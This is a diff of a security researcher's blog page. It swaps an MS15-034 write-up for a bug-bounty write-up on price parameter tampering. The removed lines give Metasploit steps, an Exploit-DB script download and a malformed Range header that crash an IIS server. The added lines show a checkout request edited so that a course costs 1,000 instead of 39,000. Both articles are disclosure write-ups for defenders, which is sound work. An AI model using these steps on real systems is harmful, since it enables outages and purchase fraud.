@@ -4,7 +4,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Does MS15–034 Still Exist Today? - ryuukhagetsu@smileforyou</title>
+
+    <!-- Primary Meta Tags -->
+    <title>Price Parameter Tampering: Changing Any Price on Websites | RyuuKhagetsu</title>
+    <meta name="title" content="Price Parameter Tampering: Changing Any Price on Websites | RyuuKhagetsu">
+    <meta name="description" content="Discover how price parameter tampering vulnerabilities allow attackers to modify product prices. A bug bounty writeup on business logic flaws in e-commerce applications.">
+    <meta name="keywords" content="Parameter Tampering, Price Manipulation, Business Logic Flaw, Bug Bounty, E-commerce Security, Web Security, OWASP, Penetration Testing">
+    <meta name="author" content="RyuuKhagetsu">
+    <meta name="robots" content="index, follow">
+
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://ryuukhagetsu.github.io/blog/parameter-tampering/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://ryuukhagetsu.github.io/blog/parameter-tampering/">
+    <meta property="og:title" content="Price Parameter Tampering: Changing Any Price on Websites">
+    <meta property="og:description" content="Discover how price parameter tampering vulnerabilities allow attackers to modify product prices.">
+    <meta property="og:image" content="https://ryuukhagetsu.github.io/assets/img/content/2.jpg">
+    <meta property="og:site_name" content="RyuuKhagetsu Blog">
+    <meta property="article:author" content="RyuuKhagetsu">
+    <meta property="article:section" content="Bug Bounty">
+    <meta property="article:tag" content="Parameter Tampering">
+    <meta property="article:tag" content="Business Logic">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://ryuukhagetsu.github.io/blog/parameter-tampering/">
+    <meta property="twitter:title" content="Price Parameter Tampering: Changing Any Price on Websites">
+    <meta property="twitter:description" content="Discover how price parameter tampering vulnerabilities allow attackers to modify product prices.">
+    <meta property="twitter:image" content="https://ryuukhagetsu.github.io/assets/img/content/2.jpg">
+
+    <!-- Structured Data / JSON-LD -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Article",
+        "headline": "Price Parameter Tampering: Changing Any Price on Websites",
+        "description": "Discover how price parameter tampering vulnerabilities allow attackers to modify product prices. A bug bounty writeup on business logic flaws in e-commerce applications.",
+        "image": "https://ryuukhagetsu.github.io/assets/img/content/2.jpg",
+        "author": {
+            "@type": "Person",
+            "name": "RyuuKhagetsu",
+            "url": "https://ryuukhagetsu.github.io"
+        },
+        "publisher": {
+            "@type": "Person",
+            "name": "RyuuKhagetsu"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https://ryuukhagetsu.github.io/blog/parameter-tampering/"
+        },
+        "keywords": ["Parameter Tampering", "Price Manipulation", "Business Logic Flaw", "Bug Bounty"]
+    }
+    </script>
+
     <!-- Bootstrap CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <!-- Google Fonts - Roboto -->
@@ -45,7 +100,7 @@
                         <a class="nav-link" href="/index.html#halloffame">Hall of Fame</a>
                     </li>
                     <li class="nav-item">
-                        <a class="nav-link active" href="index.html">Blog</a>
+                        <a class="nav-link active" href="../">Blog</a>
                     </li>
                 </ul>
             </div>
@@ -58,7 +113,7 @@
             <div class="row">
                 <div class="col-lg-8 mx-auto">
                     <!-- Back to Articles Button -->
-                    <a href="index.html#blog" class="back-to-articles">
+                    <a href="../" class="back-to-articles">
                         <svg class="back-icon" fill="currentColor" viewBox="0 0 20 20">
                             <path fill-rule="evenodd"
                                 d="M9.707 16.707a1 1 0 01-1.414 0l-6-6a1 1 0 010-1.414l6-6a1 1 0 011.414 1.414L5.414 9H17a1 1 0 110 2H5.414l4.293 4.293a1 1 0 010 1.414z"
@@ -67,7 +122,8 @@
                         Back to Articles
                     </a>
                     <!-- Article Title -->
-                    <h1 class="article-title">Does <span class="highlight">MS15–034</span> Still Exist Today?</h1>
+                    <h1 class="article-title">Price Parameter Tampering | How I Change Any <span class="highlight">Price
+                            on Website</span></h1>
 
                     <!-- Author Section - Single Row -->
                     <div class="article-author-section">
@@ -82,7 +138,7 @@
                                         <path
                                             d="M3.5 0a.5.5 0 0 1 .5.5V1h8V.5a.5.5 0 0 1 1 0V1h1a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3a2 2 0 0 1 2-2h1V.5a.5.5 0 0 1 .5-.5zM2 2a1 1 0 0 0-1 1v1h14V3a1 1 0 0 0-1-1H2zm13 3H1v9a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V5z" />
                                     </svg>
-                                    May 15, 2022
+                                    May 10, 2022
                                 </div>
                                 <div class="read-time">
                                     <svg width="12" height="12" fill="currentColor" viewBox="0 0 16 16">
@@ -91,7 +147,7 @@
                                         <path
                                             d="m8.93 6.588-2.29.287-.082.38.45.083c.294.07.352.176.288.469l-.738 3.468c-.194.897.105 1.319.808 1.319.545 0 1.178-.252 1.465-.598l.088-.416c-.2.176-.492.246-.686.246-.275 0-.375-.193-.304-.533L8.93 6.588zM9 4.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0z" />
                                     </svg>
-                                    8 min read
+                                    5 min read
                                 </div>
                             </div>
                         </div>
@@ -100,7 +156,7 @@
                     <!-- Share Section with View on Medium -->
                     <div class="article-share-section">
                         <div class="share-left">
-                            <a href="https://medium.com/@ryuukhagetsu/does-ms15-034-still-exist-today-c7e11664349c#"
+                            <a href="https://medium.com/system-weakness/price-parameter-tampering-how-i-change-any-price-on-website-dec511c499cf"
                                 class="view-on-medium" target="_blank">
                                 <svg class="medium-icon" fill="currentColor" viewBox="0 0 16 16">
                                     <path
@@ -152,289 +208,160 @@
                         <div class="highlight-box">
                             <p><strong>Disclaimer:</strong> This article is for educational purposes only. The
                                 techniques described should only be used on systems you own or have explicit permission
-                                to test. Exploiting vulnerabilities without authorization is illegal.</p>
+                                to test. Unauthorized price manipulation is illegal and unethical.</p>
                         </div>
 
                         <p>Hi everyone, how are you? I hope you guys are well. I'm RyuuKhagetsu, this is my article in
                             English, sorry if there are any mistakes. I hope you enjoy my article.</p>
 
-                        <div class="article-image">
-                            <img src="../assets/img/content/12.png" alt="Windows Server vulnerability">
-                            <p class="image-caption">Windows Server running IIS - potential target for MS15-034</p>
-                        </div>
-
-                        <h2>What is MS15–034?</h2>
-
-                        <p>MS15–034 is a critical vulnerability in HTTP.sys that may allow Remote Code Execution. This
-                            vulnerability affects the HTTP protocol stack (HTTP.sys) in Microsoft Windows, specifically
-                            in Internet Information Services (IIS).</p>
-
-                        <p>This bug was first reported in <strong>2015</strong> and it's been over 7 years since its
-                            discovery. The vulnerability allows remote attackers to execute arbitrary code or cause a
-                            denial of service (DoS) condition on affected systems.</p>
-
-
-                        <h2>Back to the Question: "Does MS15–034 Still Exist Today?"</h2>
-
-                        <div class="highlight-box">
-                            <p><strong>Answer:</strong> Yes, the bug still exists today! Despite being discovered years
-                                ago, many systems remain unpatched and vulnerable to this critical security flaw.</p>
-                        </div>
-
-                        <p>I found this vulnerability while doing penetration testing on a website. For privacy reasons,
-                            let's call it <code>www.site.com</code>. The discovery process was quite straightforward
-                            once I identified the underlying technology stack.</p>
-
-                        <h2>How I Found MS15–034</h2>
-
-                        <p>At first, I only checked what backend technology was used on the website using
-                            <strong>Wappalyzer</strong>, a popular browser extension for technology profiling.</p>
+                        <p>It all started when I wanted to study for my exams. Before paying for it, I turned on Burp
+                            Suite to see the data requests sent, hoping to find something good for me.</p>
 
                         <div class="article-image">
-                            <img src="../assets/img/blog/does-ms15-034-still-exist-today/1.webp"
-                                alt="Windows Server vulnerability">
-                            <p class="image-caption">Windows Server running IIS - potential target for MS15-034</p>
+                            <img src="https://images.unsplash.com/photo-1556742111-a301076d9d18?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80"
+                                alt="E-commerce website with price">
+                            <p class="image-caption">E-commerce learning platform showing course pricing</p>
                         </div>
 
-                        <p>The results showed that the website was running:</p>
-                        <ul>
-                            <li><strong>Operating System:</strong> Windows Server</li>
-                            <li><strong>Web Server:</strong> Microsoft IIS 8.5</li>
-                        </ul>
+                        <h2>Discovering the Price Parameter</h2>
 
-                        <p>This combination immediately reminded me of an article I had read about the MS15–034
-                            vulnerability affecting IIS web servers. The specific version (IIS 8.5) was particularly
-                            interesting as it falls within the vulnerable range.</p>
+                        <p>From intercepting the request, I found the <code>"harga:39000"</code> parameter which
+                            represents the initial price of the learning course I wanted to buy. This parameter caught
+                            my attention immediately as it seemed to be directly controlling the price display.</p>
 
-                        <h3>Technical Details of the Vulnerability</h3>
-
-                        <p>MS15-034 affects the HTTP.sys driver when it improperly parses specially crafted HTTP
-                            requests. The vulnerability can be triggered by sending a malformed Range header in an HTTP
-                            request, causing:</p>
-
-                        <ul>
-                            <li><strong>Integer Overflow:</strong> Improper handling of Range header values</li>
-                            <li><strong>Memory Corruption:</strong> Leading to potential code execution</li>
-                            <li><strong>Denial of Service:</strong> System crashes and service interruption</li>
-                            <li><strong>Blue Screen of Death (BSOD):</strong> Complete system failure</li>
-                        </ul>
-
-                        <h2>Exploitation Process</h2>
-
-                        <p>After reading about the vulnerability online, I decided to use Metasploit to verify if the
-                            target was vulnerable to this specific exploit.</p>
-
-                        <h3>Step-by-Step Exploitation</h3>
-
-                        <p><strong>1. Open Metasploit Framework</strong></p>
-                        <div class="code-block">
-                            <code>
-                                # Start Metasploit console<br>
-                                msfconsole
-                            </code>
+                        <div class="article-image">
+                            <img src="../../assets/img/blog/price-parameter-tampering/1.webp"
+                                alt="E-commerce website with price">
+                            <p class="image-caption">E-commerce learning platform showing course pricing</p>
                         </div>
 
-                        <p><strong>2. Search for MS15-034 Module</strong></p>
+                        <h2>Testing Parameter Tampering</h2>
+
+                        <p>I used the Repeater function in Burp Suite to modify the parameter and observe the server's
+                            response. This is where the magic happened!</p>
+
                         <div class="code-block">
                             <code>
-                                # Search for the specific vulnerability<br>
-                                search ms15-034<br>
+                                # Original request parameter<br>
+                                POST /checkout HTTP/1.1<br>
+                                Host: learning-platform.com<br>
+                                Content-Type: application/json<br>
                                 <br>
-                                # Or directly use the auxiliary module<br>
-                                use auxiliary/dos/http/ms15_034_ulonglongadd
+                                {<br>
+                                &nbsp;&nbsp;"course_id": "12345",<br>
+                                &nbsp;&nbsp;"harga": 39000<br>
+                                }
                             </code>
                         </div>
 
-                        <p><strong>3. Configure the Target</strong></p>
+                        <p>I changed the parameter from <code>"harga:39000"</code> to <code>"harga:1000"</code> and got
+                            a <strong>200 OK</strong> response. I was very happy, and when I checked my catalog, the
+                            price had actually changed!</p>
+
                         <div class="code-block">
                             <code>
-                                # Show available options<br>
-                                show options<br>
+                                # Modified request parameter<br>
+                                POST /checkout HTTP/1.1<br>
+                                Host: learning-platform.com<br>
+                                Content-Type: application/json<br>
                                 <br>
-                                # Find target IP using ping or dig<br>
-                                ping www.site.com<br>
-                                <br>
-                                # Set the remote host target<br>
-                                set RHOST &lt;target-ip-address&gt;
+                                {<br>
+                                &nbsp;&nbsp;"course_id": "12345",<br>
+                                &nbsp;&nbsp;"harga": 1000<br>
+                                }
                             </code>
                         </div>
 
                         <div class="article-image">
-                            <img src="../assets/img/blog/does-ms15-034-still-exist-today/2.webp"
-                                alt="Windows Server vulnerability">
-                            <p class="image-caption">Windows Server running IIS - potential target for MS15-034</p>
-                        </div>
-
-                        <p><strong>4. Vulnerability Check</strong></p>
-                        <div class="code-block">
-                            <code>
-                                # Check if the target is vulnerable<br>
-                                check
-                            </code>
-                        </div>
-
-                        <div class="article-image">
-                            <img src="../assets/img/blog/does-ms15-034-still-exist-today/3.webp"
-                                alt="Windows Server vulnerability">
-                            <p class="image-caption">Windows Server running IIS - potential target for MS15-034</p>
+                            <img src="../../assets/img/blog/price-parameter-tampering/2.webp"
+                                alt="E-commerce website with price">
+                            <p class="image-caption">E-commerce learning platform showing course pricing</p>
                         </div>
 
                         <div class="highlight-box">
-                            <p><strong>Result:</strong> The check confirmed that the target server was indeed vulnerable
-                                to MS15-034!</p>
+                            <p><strong>Critical Vulnerability Found:</strong> The server accepted the modified price
+                                parameter without any server-side validation, allowing me to change the course price
+                                from IDR 39,000 to IDR 1,000!</p>
                         </div>
 
-                        <p><strong>5. Execute the Exploit</strong></p>
-                        <div class="code-block">
-                            <code>
-                                # Execute the DoS attack<br>
-                                exploit<br>
-                                # or alternatively<br>
-                                run
-                            </code>
-                        </div>
-
-                        <h3>Alternative Exploitation Method</h3>
-
-                        <p>Instead of using Metasploit, I also tested with a Python script from Exploit-DB. This script
-                            provides more control over the exploitation process and demonstrates the raw HTTP request
-                            manipulation.</p>
-
-                        <div class="code-block">
-                            <code>
-                                # Download exploit from Exploit-DB<br>
-                                wget https://www.exploit-db.com/exploits/36776<br>
-                                <br>
-                                # Execute the Python exploit<br>
-                                python 36776.py &lt;target-ip-address&gt;
-                            </code>
-                        </div>
-
-                        <h2>Exploitation Results</h2>
-
-                        <p>I won't demonstrate the full attack, but in my case, when the script was executed against
-                            <code>www.site.com</code>, the server experienced a complete restart. The website crashed
-                            temporarily, confirming the successful exploitation of the MS15-034 vulnerability.</p>
-
-                        <div class="highlight-box">
-                            <p><strong>Impact:</strong> The successful exploit resulted in a Denial of Service (DoS)
-                                condition, causing the entire web server to restart and making the website temporarily
-                                unavailable to legitimate users.</p>
-                        </div>
-
-                        <h2>Technical Analysis</h2>
-
-                        <p>The vulnerability occurs due to improper validation of HTTP Range header requests. When a
-                            specially crafted request is sent with specific Range values, it triggers an integer
-                            overflow in the HTTP.sys driver, leading to:</p>
-
-                        <ul>
-                            <li><strong>Memory Corruption:</strong> Invalid memory access patterns</li>
-                            <li><strong>System Instability:</strong> Kernel-level crashes</li>
-                            <li><strong>Service Interruption:</strong> Complete web service failure</li>
-                        </ul>
-
-                        <h3>Vulnerable HTTP Request Example</h3>
-
-                        <div class="code-block">
-                            <code>
-                                GET / HTTP/1.1<br>
-                                Host: target-website.com<br>
-                                Range: bytes=0-18446744073709551615<br>
-                                <br>
-                                # The large Range value triggers the vulnerability
-                            </code>
+                        <div class="article-image">
+                            <img src="../../assets/img/blog/price-parameter-tampering/3.webp"
+                                alt="E-commerce website with price">
+                            <p class="image-caption">E-commerce learning platform showing course pricing</p>
                         </div>
 
                         <h2>Impact Assessment</h2>
 
-                        <p>The MS15-034 vulnerability has severe implications for affected systems:</p>
+                        <p>This vulnerability demonstrates a critical business logic flaw where:</p>
 
                         <ul>
-                            <li><strong>Business Continuity:</strong> Web services become unavailable</li>
-                            <li><strong>Financial Impact:</strong> Revenue loss due to downtime</li>
-                            <li><strong>Reputation Damage:</strong> User trust and confidence erosion</li>
-                            <li><strong>Security Exposure:</strong> Potential for further exploitation</li>
+                            <li><strong>Financial Loss:</strong> Attackers could purchase premium courses at drastically
+                                reduced prices</li>
+                            <li><strong>Revenue Impact:</strong> Mass exploitation could lead to significant financial
+                                losses for the platform</li>
+                            <li><strong>Business Integrity:</strong> Price manipulation undermines the platform's
+                                pricing model</li>
+                            <li><strong>Easy Exploitation:</strong> No special tools required beyond basic web proxy
+                                software</li>
                         </ul>
 
                         <h2>Responsible Disclosure</h2>
 
-                        <p>Following responsible disclosure practices, I immediately reported this critical
-                            vulnerability to the website administrators.</p>
-
+                        <p>I immediately contacted the website administrator and reported this critical vulnerability
+                            through their responsible disclosure process.</p>
 
                         <h2>Timeline</h2>
 
                         <div class="code-block">
                             <code>
-                                📅 01 May 2022: Vulnerability reported to www.site.com<br>
-                                ✅ 01 May 2022: Website administrators respond to my report<br>
-                                🎉 01 May 2022: Received bounty reward for the discovery
+                                📅 01 May 2022: Vulnerability reported to admin<br>
+                                ✅ 01 May 2022: Got feedback confirming the report<br>
+                                🎉 02 May 2022: Received bounty reward for the finding
                             </code>
                         </div>
 
                         <div class="highlight-box">
-                            <p><strong>Fast Response:</strong> The organization demonstrated excellent security
-                                practices with immediate acknowledgment and same-day resolution of the reported
-                                vulnerability.</p>
+                            <p><strong>Note:</strong> The developer gave me permission to disclose this report without
+                                mentioning their platform name or specific details that could identify the system.</p>
                         </div>
 
-                        <h2>Remediation and Prevention</h2>
+                        <h2>Prevention Measures</h2>
 
-                        <p>To protect against MS15-034 and similar vulnerabilities, organizations should implement:</p>
-
-                        <h3>Immediate Actions</h3>
-                        <ul>
-                            <li><strong>Apply Security Patches:</strong> Install Microsoft Security Update MS15-034</li>
-                            <li><strong>System Updates:</strong> Ensure Windows Server and IIS are fully updated</li>
-                            <li><strong>Vulnerability Scanning:</strong> Regular automated security assessments</li>
-                        </ul>
-
-                        <h3>Long-term Security Measures</h3>
-                        <ul>
-                            <li><strong>Patch Management:</strong> Systematic approach to security updates</li>
-                            <li><strong>Web Application Firewall:</strong> Filter malicious HTTP requests</li>
-                            <li><strong>Network Monitoring:</strong> Detect unusual traffic patterns</li>
-                            <li><strong>Security Auditing:</strong> Regular penetration testing and assessments</li>
-                        </ul>
-
-                        <h2>Why This Vulnerability Still Exists</h2>
-
-                        <p>Despite being discovered in 2015, MS15-034 continues to affect systems today due to:</p>
+                        <p>To prevent similar price manipulation vulnerabilities, developers should implement:</p>
 
                         <ul>
-                            <li><strong>Legacy Systems:</strong> Older servers not receiving regular updates</li>
-                            <li><strong>Patch Management Issues:</strong> Inconsistent security update processes</li>
-                            <li><strong>Awareness Gaps:</strong> Administrators unaware of critical vulnerabilities</li>
-                            <li><strong>Testing Concerns:</strong> Fear of breaking production systems during updates
-                            </li>
+                            <li><strong>Server-Side Validation:</strong> Always validate prices on the server side,
+                                never trust client-side data</li>
+                            <li><strong>Database-Driven Pricing:</strong> Fetch prices from secure database rather than
+                                accepting them from client requests</li>
+                            <li><strong>Session Management:</strong> Use secure session tokens to track legitimate
+                                pricing data</li>
+                            <li><strong>Input Sanitization:</strong> Validate and sanitize all user inputs before
+                                processing</li>
+                            <li><strong>Business Logic Testing:</strong> Regularly test critical business functions for
+                                manipulation vulnerabilities</li>
                         </ul>
-
 
                         <h2>Lessons Learned</h2>
 
-                        <p>This discovery reinforced several important cybersecurity principles:</p>
+                        <p>This experience taught me several important lessons:</p>
 
                         <ul>
-                            <li><strong>Legacy Vulnerabilities Persist:</strong> Old vulnerabilities remain dangerous
-                            </li>
-                            <li><strong>Regular Assessment:</strong> Continuous security testing is essential</li>
-                            <li><strong>Technology Profiling:</strong> Understanding target systems aids vulnerability
-                                identification</li>
-                            <li><strong>Responsible Disclosure:</strong> Ethical reporting benefits everyone</li>
+                            <li>Always test business-critical parameters during security assessments</li>
+                            <li>Simple parameter manipulation can lead to significant vulnerabilities</li>
+                            <li>Responsible disclosure builds trust with organizations and the security community</li>
+                            <li>Even basic tools like Burp Suite can uncover high-impact vulnerabilities</li>
                         </ul>
 
                         <h2>Conclusion</h2>
 
-                        <p>The persistence of MS15-034 in 2022 (and likely beyond) demonstrates that legacy
-                            vulnerabilities remain a significant threat to organizations worldwide. Despite patches
-                            being available for years, many systems continue to operate without adequate security
-                            updates.</p>
+                        <p>I forgot my original goal of changing the price and buying the lessons I had changed the
+                            price for, but it's okay for me. The learning experience and the bounty reward were more
+                            valuable than the discount I could have gotten!</p>
 
-                        <p>This case study highlights the importance of maintaining current security patches, regular
-                            vulnerability assessments, and proactive security management. For security researchers and
-                            penetration testers, it shows that sometimes the most effective attacks target well-known
-                            vulnerabilities that organizations have simply failed to address.</p>
+                        <p>This case demonstrates how critical business logic vulnerabilities can be discovered through
+                            systematic testing and curiosity. The key is to always question how applications handle
+                            sensitive data and to test the boundaries of their validation mechanisms.</p>
 
                         <p>Maybe that's all from me, hopefully it can be a reference for you and sorry if there are
                             things that are not clear. I'm RyuuKhagetsu, see you in the next article.</p>
@@ -443,14 +370,14 @@
                         <div class="article-tags">
                             <h4>Tags:</h4>
                             <div class="tags-list">
-                                <span class="tag">#MS15034</span>
-                                <span class="tag">#HTTPSys</span>
-                                <span class="tag">#IISVulnerability</span>
-                                <span class="tag">#WindowsSecurity</span>
-                                <span class="tag">#DoSAttack</span>
-                                <span class="tag">#Metasploit</span>
-                                <span class="tag">#VulnerabilityResearch</span>
-                                <span class="tag">#PenetrationTesting</span>
+                                <span class="tag">#ParameterTampering</span>
+                                <span class="tag">#PriceManipulation</span>
+                                <span class="tag">#BugBounty</span>
+                                <span class="tag">#WebSecurity</span>
+                                <span class="tag">#BurpSuite</span>
+                                <span class="tag">#BusinessLogic</span>
+                                <span class="tag">#ResponsibleDisclosure</span>
+                                <span class="tag">#WebApplicationSecurity</span>
                             </div>
                         </div>
                     </div>
@@ -472,9 +399,9 @@
                 <div class="col-md-6 mb-4">
                     <div class="article-card-horizontal">
                         <div class="article-image">
-                            <img src="../assets/img/content/1.jpeg">
+                            <img src="../../assets/img/content/1.jpeg">
                             <div class="article-overlay">
-                                <a href="how-do-i-get-root-on-linux.html" class="article-link">read article</a>
+                                <a href="../how-do-i-get-root-on-linux/" class="article-link">read article</a>
                             </div>
                         </div>
                         <div class="related-content">
@@ -495,9 +422,9 @@
                 <div class="col-md-6 mb-4">
                     <div class="article-card-horizontal">
                         <div class="article-image">
-                            <img src="../assets/img/content/1.jpeg">
+                            <img src="../../assets/img/content/1.jpeg">
                             <div class="article-overlay">
-                                <a href="how-do-i-get-root-on-linux.html" class="article-link">read article</a>
+                                <a href="../how-do-i-get-root-on-linux/" class="article-link">read article</a>
                             </div>
                         </div>
                         <div class="related-content">
